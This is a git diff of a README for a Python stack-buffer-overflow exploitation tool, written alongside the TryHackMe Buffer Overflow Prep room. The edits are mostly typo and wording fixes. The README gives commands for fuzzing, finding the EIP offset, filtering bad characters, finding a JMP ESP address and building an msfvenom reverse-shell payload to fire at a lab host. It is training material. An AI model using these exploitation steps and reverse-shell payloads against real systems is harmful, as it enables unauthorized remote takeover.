@@ -3,11 +3,14 @@
 
 ## Fuzzing
 
-In order to Fuzz the application we need to select the connection type and also supplying the IP, Port and Prefix.
-The Prefix can be HTTP POST parameters or a command from a program, e.g in that context Help would be the Prefix: 
+In order to Fuzz the application we need to select the connection type and also supply the IP, Port and Prefix.
+The Prefix can be an HTTP POST parameters or a command from a program, e.g in that context **HELP** would be the Prefix: 
 ```
 HELP AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
+For the other examples, I will use **OVERFLOW9** as our **Prefix** since I made the script along side doing the exercice on TryHackMe:
+https://tryhackme.com/room/bufferoverflowprep
+
 ```
 python3 Badboy.py --mode fuzz -c raw-tcp [IP] [PORT] [PREFIX]
 ```
@@ -18,32 +21,32 @@ I then decided to generate a cyclic pattern of 1600 bytes (100 bytes more), just
 ```
 msf-pattern_create -l 1600 | python3 Badboy.py --mode inject -c raw-tcp 10.10.112.205 1337 "OVERFLOW9" --cpattern 1
 ```
-![Inject Cyclic PAttern](img/inject-a-cyclic-pattern-from-stdin.png)
+![Inject Cyclic Pattern](img/inject-a-cyclic-pattern-from-stdin.png)
 
 After having injected the cyclic pattern, we can see that the EIP value is being affected, copy the value in EIP
-and supply it to **msf-pattern_offset**
+and supply it to **msf-pattern_offset** with the same length we used in **msf-pattern_create**.
 
-![Get Cyclic PAttern](img/get-cyclic-char-in-eip.png)
+![Get Cyclic Pattern](img/get-cyclic-char-in-eip.png)
 ```
 msf-pattern_offset -l 1600 -q "35794234"
 ```
 ![Get Offset](img/get-offset-from-cyclic-chars.png)
 
-Now that we have found the correct offset, we can supply it to Badboy, to check if EIP will hold the value "CCCC" or "43434343"
+Now that we have found the correct offset we can supply it to Badboy, in order to check if EIP will hold the value "CCCC" or "43434343"
 ```
 python3 Badboy.py --mode inject -c raw-tcp 10.10.112.205 1337 "OVERFLOW9" -off 1514
 ```
 ![Check Offset](img/checking-offset-for-eip.png)
 
 By default if you have the good offset, Badboy will put the character "CCCC" or "43434343" in hex in the EIP register
-If you see this value, that means that you have the good offset and you have controlle EIP, you can move to the next step.
+If you see this value, that means that you have the good offset and you have controlled EIP, you can move to the next step.
 ![Check controlled EIP](img/eip-controlled.png)
 
-## Testing and Filtering Bad Char
+## Testing and Filtering Bad Characters
 
-Bad char can be filtered quickly and easily directly from the shell.
-Simply start by providing the Bad char (\x00) or "00" in our case.
-All Badchars needs to be coma seperated like followed : 
+Bad characters can be filtered quickly and easily directly from the shell.
+Simply start by providing the bad character (\x00) or "00" in our case.
+All bad characters needs to be coma seperated like followed : 
 ```
 -b "00,41,2f"
 ```
@@ -52,7 +55,7 @@ python3 Badboy.py --mode inject -c raw-tcp [IP] [PORT] [PREFIX] -off [OFFSET] -b
 ```
 ![Badchar1](img/inject-testing-badchar-1.png)
 
-Repeat the process until every Bad chars have been filtered out.
+Repeat the process until every bad characters have been filtered out.
 ![Badchar2](img/inject-testing-badchar-2.png)
 ![Badchar3](img/inject-testing-badchar-3.png)
 ![Badchar4](img/inject-testing-badchar-4.png)
@@ -65,7 +68,8 @@ In Immunity Debugger, type the following command in the command box:
 !mona jmp -r esp -cpb "\x00\x04\x3e\x3f\xe1"
 ```
 ![JMP ESP](img/get-jmp-esp-address-from-mona.png)
-Don't forget to revert the bytes of the address, since it is little endian.
+
+Don't forget to revert the bytes order of the address, since it is little endian.
 E.g : 625011d3 becomes d3115062
 
 ## Creating Shellcode
@@ -76,9 +80,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -f c
 ```
 
 ## Trigger the Exploit 
-Once you have the eliminated all the Bad chars, that you have your Offset and your have the value of EIP.
-Put the Shell code in the place reserved for it in the script and fire the exploit like the screenshot below: 
+Once you have the eliminated all the **bad characters**, that you have your **offset** and your have the value of **EIP**.
+Put the Shell code in the place reserved for it in the script and fire the exploit like the screenshot below and you should get a reverse shell: 
 ```
 python3 Badboy.py --mode inject -c raw-tcp 10.10.112.205 1337 "OVERFLOW9" -off 1514 -eip 'd3115062'
 ```
-![Fuzzing](img/inject-trigger-shell.png)
+![Exploit](img/inject-trigger-shell.png)
